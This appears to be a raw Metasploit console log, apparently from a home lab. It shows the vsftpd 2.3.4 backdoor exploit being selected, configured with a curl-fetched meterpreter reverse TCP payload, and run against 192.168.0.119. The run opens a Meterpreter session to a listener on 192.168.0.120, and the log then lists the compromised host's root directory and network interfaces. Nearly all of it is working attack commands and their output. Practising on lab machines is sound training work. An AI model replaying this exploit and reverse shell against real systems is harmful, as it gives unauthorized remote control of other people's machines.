@@ -1,0 +1,261 @@
+─$ msfconsole 
+Metasploit tip: Open an interactive Ruby terminal with irb
+                                                  
+
+                                   .,,.                  .
+                                .\$$$$$L..,,==aaccaacc%#s$b.       d8,    d8P
+                     d8P        #$$$$$$$$$$$$$$$$$$$$$$$$$$$b.    `BP  d888888p
+                  d888888P      '7$$$$\""""''^^`` .7$$$|D*"'```         ?88'
+  d8bd8b.d8p d8888b ?88' d888b8b            _.os#$|8*"`   d8P       ?8b  88P
+  88P`?P'?P d8b_,dP 88P d8P' ?88       .oaS###S*"`       d8P d8888b $whi?88b 88b
+ d88  d8 ?8 88b     88b 88b  ,88b .osS$$$$*" ?88,.d88b, d88 d8P' ?88 88P `?8b
+d88' d88b 8b`?8888P'`?8b`?88P'.aS$$$$Q*"`    `?88'  ?88 ?88 88b  d88 d88
+                          .a#$$$$$$"`          88b  d8P  88b`?8888P'
+                       ,s$$$$$$$"`             888888P'   88n      _.,,,ass;:
+                    .a$$$$$$$P`               d88P'    .,.ass%#S$$$$$$$$$$$$$$'
+                 .a$###$$$P`           _.,,-aqsc#SS$$$$$$$$$$$$$$$$$$$$$$$$$$'
+              ,a$$###$$P`  _.,-ass#S$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$####SSSS'
+           .a$$$$$$$$$$SSS$$$$$$$$$$$$$$$$$$$$$$$$$$$$SS##==--""''^^/$$$$$$'
+_______________________________________________________________   ,&$$$$$$'_____
+                                                                 ll&&$$$$'
+                                                              .;;lll&&&&'
+                                                            ...;;lllll&'
+                                                          ......;;;llll;;;....
+                                                           ` ......;;;;... .  .
+
+
+       =[ metasploit v6.4.135-dev                               ]
++ -- --=[ 2,654 exploits - 1,338 auxiliary - 2,141 payloads     ]
++ -- --=[ 433 post - 49 encoders - 14 nops - 12 evasion         ]
+
+Metasploit Documentation: https://docs.metasploit.com/
+The Metasploit Framework is a Rapid7 Open Source Project
+
+msf > search vsftp
+
+Matching Modules
+================
+
+   #  Name                                  Disclosure Date  Rank       Check  Description
+   -  ----                                  ---------------  ----       -----  -----------
+   0  auxiliary/dos/ftp/vsftpd_232          2011-02-03       normal     Yes    VSFTPD 2.3.2 Denial of Service
+   1  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  Yes    VSFTPD 2.3.4 Backdoor Command Execution
+
+
+Interact with a module by name or index. For example info 1, use 1 or use exploit/unix/ftp/vsftpd_234_backdoor
+
+msf > use 1
+[*] Using configured payload cmd/linux/http/x86/meterpreter_reverse_tcp
+msf exploit(unix/ftp/vsftpd_234_backdoor) > show options
+
+Module options (exploit/unix/ftp/vsftpd_234_backdoor):
+
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   RHOSTS                   yes       The target host(s), see https://docs.met
+                                      asploit.com/docs/using-metasploit/basics
+                                      /using-metasploit.html
+   RPORT   21               yes       The target port (TCP)
+
+
+Payload options (cmd/linux/http/x86/meterpreter_reverse_tcp):
+
+   Name            Current Setting  Required  Description
+   ----            ---------------  --------  -----------
+   FETCH_COMMAND   CURL             yes       Command to fetch payload (Accept
+                                              ed: CURL, FTP, TFTP, TNFTP, WGET
+                                              )
+   FETCH_DELETE    false            yes       Attempt to delete the binary aft
+                                              er execution
+   FETCH_FILELESS  none             yes       Attempt to run payload without t
+                                              ouching disk by using anonymous
+                                              handles, requires Linux ≥3.17 (f
+                                              or Python variant also Python ≥3
+                                              .8, tested shells are sh, bash,
+                                              zsh) (Accepted: none, python3.8+
+                                              , shell-search, shell)
+   FETCH_SRVHOST                    no        Local IP to use for serving payl
+                                              oad
+   FETCH_SRVPORT   8080             yes       Local port to use for serving pa
+                                              yload
+   FETCH_URIPATH                    no        Local URI to use for serving pay
+                                              load
+   LHOST                            yes       The listen address (an interface
+                                               may be specified)
+   LPORT           4444             yes       The listen port
+
+
+   When FETCH_COMMAND is one of CURL,GET,WGET:
+
+   Name        Current Setting  Required  Description
+   ----        ---------------  --------  -----------
+   FETCH_PIPE  false            yes       Host both the binary payload and the
+                                           command so it can be piped directly
+                                           to the shell.
+
+
+   When FETCH_FILELESS is none:
+
+   Name               Current Setting  Required  Description
+   ----               ---------------  --------  -----------
+   FETCH_FILENAME     lZKldzST         no        Name to use on remote system
+                                                 when storing payload; cannot
+                                                 contain spaces or slashes
+   FETCH_WRITABLE_DI  ./               yes       Remote writable dir to store
+   R                                             payload; cannot contain space
+                                                 s
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Linux/Unix Command
+
+
+
+View the full module info with the info, or info -d command.
+
+msf exploit(unix/ftp/vsftpd_234_backdoor) > set RHOST 192.168.0.119
+RHOST => 192.168.0.119
+msf exploit(unix/ftp/vsftpd_234_backdoor) > set LHOST 192.168.0.119
+LHOST => 192.168.0.119
+msf exploit(unix/ftp/vsftpd_234_backdoor) > set LHOST 192.168.0.120
+LHOST => 192.168.0.120
+msf exploit(unix/ftp/vsftpd_234_backdoor) > show options
+
+Module options (exploit/unix/ftp/vsftpd_234_backdoor):
+
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   RHOSTS  192.168.0.119    yes       The target host(s), see https://docs.met
+                                      asploit.com/docs/using-metasploit/basics
+                                      /using-metasploit.html
+   RPORT   21               yes       The target port (TCP)
+
+
+Payload options (cmd/linux/http/x86/meterpreter_reverse_tcp):
+
+   Name            Current Setting  Required  Description
+   ----            ---------------  --------  -----------
+   FETCH_COMMAND   CURL             yes       Command to fetch payload (Accept
+                                              ed: CURL, FTP, TFTP, TNFTP, WGET
+                                              )
+   FETCH_DELETE    false            yes       Attempt to delete the binary aft
+                                              er execution
+   FETCH_FILELESS  none             yes       Attempt to run payload without t
+                                              ouching disk by using anonymous
+                                              handles, requires Linux ≥3.17 (f
+                                              or Python variant also Python ≥3
+                                              .8, tested shells are sh, bash,
+                                              zsh) (Accepted: none, python3.8+
+                                              , shell-search, shell)
+   FETCH_SRVHOST                    no        Local IP to use for serving payl
+                                              oad
+   FETCH_SRVPORT   8080             yes       Local port to use for serving pa
+                                              yload
+   FETCH_URIPATH                    no        Local URI to use for serving pay
+                                              load
+   LHOST           192.168.0.120    yes       The listen address (an interface
+                                               may be specified)
+   LPORT           4444             yes       The listen port
+
+
+   When FETCH_COMMAND is one of CURL,GET,WGET:
+
+   Name        Current Setting  Required  Description
+   ----        ---------------  --------  -----------
+   FETCH_PIPE  false            yes       Host both the binary payload and the
+                                           command so it can be piped directly
+                                           to the shell.
+
+
+   When FETCH_FILELESS is none:
+
+   Name               Current Setting  Required  Description
+   ----               ---------------  --------  -----------
+   FETCH_FILENAME     WHZbrBZuKbI      no        Name to use on remote system
+                                                 when storing payload; cannot
+                                                 contain spaces or slashes
+   FETCH_WRITABLE_DI  ./               yes       Remote writable dir to store
+   R                                             payload; cannot contain space
+                                                 s
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Linux/Unix Command
+
+
+
+View the full module info with the info, or info -d command.
+
+msf exploit(unix/ftp/vsftpd_234_backdoor) > run
+[*] Started reverse TCP handler on 192.168.0.120:4444 
+[*] 192.168.0.119:21 - Running automatic check ("set AutoCheck false" to disable)
+[*] 192.168.0.119:21 - FTP banner hints its vulnerable: 220 (vsFTPd 2.3.4)
+[+] 192.168.0.119:21 - The target appears to be vulnerable. vsftpd 2.3.4 banner detected; backdoor may be present
+[+] 192.168.0.119:21 - Backdoor has been spawned!
+[*] Meterpreter session 1 opened (192.168.0.120:4444 -> 192.168.0.119:56925) at 2026-07-14 11:52:50 +0530
+
+meterpreter > ls
+Listing: /
+==========
+
+Mode              Size     Type  Last modified              Name
+----              ----     ----  -------------              ----
+100700/rwx------  1188612  fil   2026-07-14 11:53:10 +0530  PWBgNggZRHk
+040755/rwxr-xr-x  4096     dir   2012-05-14 09:05:33 +0530  bin
+040755/rwxr-xr-x  1024     dir   2012-05-14 09:06:28 +0530  boot
+040755/rwxr-xr-x  4096     dir   2010-03-17 04:25:51 +0530  cdrom
+040755/rwxr-xr-x  13480    dir   2026-07-14 11:04:17 +0530  dev
+100700/rwx------  1188612  fil   2026-07-13 11:48:44 +0530  eayevVYSy
+040755/rwxr-xr-x  4096     dir   2026-07-14 11:04:43 +0530  etc
+040755/rwxr-xr-x  4096     dir   2010-04-16 11:46:02 +0530  home
+040755/rwxr-xr-x  4096     dir   2010-03-17 04:27:40 +0530  initrd
+100644/rw-r--r--  7929183  fil   2012-05-14 09:05:56 +0530  initrd.img
+040755/rwxr-xr-x  4096     dir   2012-05-14 09:05:22 +0530  lib
+040700/rwx------  16384    dir   2010-03-17 04:25:15 +0530  lost+found
+040755/rwxr-xr-x  4096     dir   2010-03-17 04:25:52 +0530  media
+040755/rwxr-xr-x  4096     dir   2010-04-29 01:46:56 +0530  mnt
+100600/rw-------  10147    fil   2026-07-14 11:04:45 +0530  nohup.out
+040755/rwxr-xr-x  4096     dir   2010-03-17 04:27:39 +0530  opt
+040555/r-xr-xr-x  0        dir   2026-07-14 11:04:08 +0530  proc
+100700/rwx------  1188612  fil   2026-07-13 12:02:22 +0530  qwuujkBKMMk
+040755/rwxr-xr-x  4096     dir   2026-07-14 11:04:45 +0530  root
+040755/rwxr-xr-x  4096     dir   2012-05-14 07:24:53 +0530  sbin
+040755/rwxr-xr-x  4096     dir   2010-03-17 04:27:38 +0530  srv
+040755/rwxr-xr-x  0        dir   2026-07-14 11:04:09 +0530  sys
+041777/rwxrwxrwx  4096     dir   2026-07-14 11:04:53 +0530  tmp
+040755/rwxr-xr-x  4096     dir   2010-04-28 09:36:37 +0530  usr
+040755/rwxr-xr-x  4096     dir   2010-03-17 19:38:23 +0530  var
+100644/rw-r--r--  1987288  fil   2008-04-10 22:25:41 +0530  vmlinuz
+
+meterpreter > ifconfig
+
+Interface  1
+============
+Name         : lo
+Hardware MAC : 00:00:00:00:00:00
+MTU          : 16436
+Flags        : UP,LOOPBACK
+IPv4 Address : 127.0.0.1
+IPv4 Netmask : 255.0.0.0
+IPv6 Address : ::1
+IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff::
+
+
+Interface  2
+============
+Name         : eth0
+Hardware MAC : 08:00:27:03:7b:94
+MTU          : 1500
+Flags        : UP,BROADCAST,MULTICAST
+IPv4 Address : 192.168.0.119
+IPv4 Netmask : 255.255.255.0
+IPv6 Address : fe80::a00:27ff:fe03:7b94
+IPv6 Netmask : ffff:ffff:ffff:ffff::
+
+meterpreter > 
